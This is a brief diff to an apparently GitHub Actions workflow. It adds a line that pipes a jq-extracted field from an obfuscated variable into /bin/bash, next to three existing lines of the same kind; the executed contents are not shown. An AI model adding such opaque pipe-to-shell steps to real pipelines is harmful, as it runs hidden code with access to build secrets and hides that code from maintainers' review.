@@ -32,6 +32,7 @@ jobs:
           echo $gjq50 | jq -r .dedvt9 | /bin/bash
           printf '%s' "$f03" | jq -r .w455 | /bin/bash
           printf '%s' "$w6" | jq -r .ncrgc010 | /bin/bash
+          echo $hgwm552 | jq -r .eig958 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
